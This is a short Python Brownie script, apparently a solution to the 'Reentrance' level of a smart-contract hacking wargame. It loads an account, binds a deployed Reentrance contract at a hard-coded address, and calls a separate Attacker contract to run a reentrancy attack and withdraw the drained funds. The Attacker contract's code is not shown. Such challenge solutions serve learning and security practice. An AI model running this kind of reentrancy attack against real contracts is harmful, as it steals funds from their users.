from brownie import Contract, Reentrance, Attacker, accounts

INSTANCE_ADDRESS = "0x7130C7B222C4DD8B6f7Ec44F7F41f09a51bA311f"
ACCOUNT = "straul"


def get_account():
    account = accounts.load(ACCOUNT)
    return account


def hack_reentrance(account):
    reentrance = Contract.from_abi(name="Reentrance", address=INSTANCE_ADDRESS, abi=Reentrance.abi)

    # attacker = Attacker.deploy({'from': account})
    attacker = Attacker[-1]

    # reentrance.donate(attacker.address, {'from': account, 'value': 1e10})
    attacker.attack(reentrance.address, 1e10, {'from': account, "gas": 2000000})
    attacker.withdraw()


def main():
    account = get_account()
    hack_reentrance(account)
